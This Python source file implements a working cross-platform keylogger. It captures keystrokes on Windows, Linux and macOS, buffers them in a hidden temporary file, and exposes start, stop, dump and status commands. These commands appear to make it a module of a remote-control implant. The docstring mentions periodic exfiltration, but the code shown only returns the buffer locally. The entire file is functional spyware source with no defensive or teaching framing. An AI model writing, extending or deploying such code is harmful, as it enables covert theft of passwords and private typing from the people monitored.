"""Keylogger — background keyboard capture with periodic exfiltration.
Uses platform-specific APIs:
  Linux: pynput or evdev (requires root or input group)
  macOS: pynput or Accessibility API
  Windows: ctypes/GetAsyncKeyState or pynput"""

import sys
import os
import threading
import time
import tempfile
from datetime import datetime


class Keylogger:
    """Background keylogger that writes captured keystrokes to a buffer file."""

    def __init__(self):
        self._running = False
        self._thread: threading.Thread | None = None
        self._buffer_file = os.path.join(tempfile.gettempdir(), ".kl_buf")

    @property
    def is_running(self) -> bool:
        return self._running

    def start(self):
        if self._running:
            return "Keylogger already running"

        self._running = True
        self._thread = threading.Thread(target=self._capture_loop, daemon=True)
        self._thread.start()
        return "Keylogger started"

    def stop(self):
        self._running = False
        if self._thread:
            self._thread.join(timeout=3)
            self._thread = None
        return "Keylogger stopped"

    def get_buffer(self) -> str:
        """Return captured keystrokes and clear the buffer."""
        if not os.path.exists(self._buffer_file):
            return "(no keystrokes captured)"
        with open(self._buffer_file, "r", errors="replace") as f:
            content = f.read()
        # Clear buffer after reading
        open(self._buffer_file, "w").close()
        return content

    def _capture_loop(self):
        """Main capture loop — platform-specific implementation."""
        try:
            if sys.platform == "win32":
                self._capture_windows()
            elif sys.platform == "linux":
                self._capture_linux()
            elif sys.platform == "darwin":
                self._capture_macos()
            else:
                self._write(f"[Unsupported platform: {sys.platform}]")
        except Exception as e:
            self._write(f"[Keylogger error: {e}]")

    def _write(self, text: str):
        try:
            with open(self._buffer_file, "a") as f:
                f.write(text)
        except OSError:
            pass

    def _capture_windows(self):
        """Windows keylogger using GetAsyncKeyState polling."""
        import ctypes
        user32 = ctypes.windll.user32

        while self._running:
            for key_code in range(1, 256):
                if user32.GetAsyncKeyState(key_code) & 0x0001:
                    timestamp = datetime.now().strftime("%H:%M:%S")
                    char = self._vkey_to_char(key_code)
                    if char:
                        if char == "[ENTER]":
                            self._write(f"\n[{timestamp}] ")
                        else:
                            self._write(char)
            time.sleep(0.01)

    def _capture_linux(self):
        """Linux keylogger using /dev/input devices (needs root/input group)."""
        try:
            from evdev import InputDevice, categorize, ecodes
            import glob

            devices = glob.glob("/dev/input/event*")
            if not devices:
                self._write("[No input devices found]")
                return

            dev = InputDevice(devices[0])
            for event in dev.read_loop():
                if not self._running:
                    break
                if event.type == ecodes.EV_KEY and event.value == 1:
                    key_event = categorize(event)
                    key_name = key_event.keycode
                    timestamp = datetime.now().strftime("%H:%M:%S")
                    if "KEY_ENTER" in str(key_name):
                        self._write(f"\n[{timestamp}] ")
                    elif "KEY_" in str(key_name):
                        self._write(key_name.replace("KEY_", "").lower())
        except ImportError:
            self._write("[evdev not installed — try: pip install evdev]")

    def _capture_macos(self):
        """macOS keylogger using pynput (requires Accessibility permissions)."""
        try:
            from pynput import keyboard

            def on_press(key):
                if not self._running:
                    return False
                timestamp = datetime.now().strftime("%H:%M:%S")
                try:
                    self._write(str(key.char))
                except AttributeError:
                    if key == keyboard.Key.enter:
                        self._write(f"\n[{timestamp}] ")
                    else:
                        self._write(f"[{key.name}]")

            with keyboard.Listener(on_press=on_press) as listener:
                while self._running:
                    time.sleep(0.5)
                listener.stop()
        except ImportError:
            self._write("[pynput not installed — try: pip install pynput]")

    def _vkey_to_char(self, vk: int) -> str | None:
        """Convert Windows virtual key code to character."""
        SPECIAL_KEYS = {
            0x0D: "[ENTER]", 0x09: "[TAB]", 0x1B: "[ESC]",
            0x20: " ", 0x08: "[BACK]", 0x2E: "[DEL]",
            0x10: "[SHIFT]", 0x11: "[CTRL]", 0x12: "[ALT]",
            0x14: "[CAPS]", 0x5B: "[LWIN]",
        }
        if vk in SPECIAL_KEYS:
            return SPECIAL_KEYS[vk]
        if 0x30 <= vk <= 0x39:  # 0-9
            return chr(vk)
        if 0x41 <= vk <= 0x5A:  # A-Z
            return chr(vk).lower()
        return None


# Module-level singleton
_keylogger = Keylogger()


def run(args: list[str]) -> str:
    """Module entry point.

    Usage:
        keylog start      — start background keylogger
        keylog stop       — stop keylogger
        keylog dump       — read and clear buffer
        keylog status     — check if running
    """
    if not args:
        return "Usage: keylog start|stop|dump|status"

    cmd = args[0].lower()
    if cmd == "start":
        return _keylogger.start()
    elif cmd == "stop":
        return _keylogger.stop()
    elif cmd == "dump":
        return _keylogger.get_buffer()
    elif cmd == "status":
        return f"Keylogger {'running' if _keylogger.is_running else 'stopped'}"
    else:
        return f"Unknown command: {cmd}. Usage: keylog start|stop|dump|status"
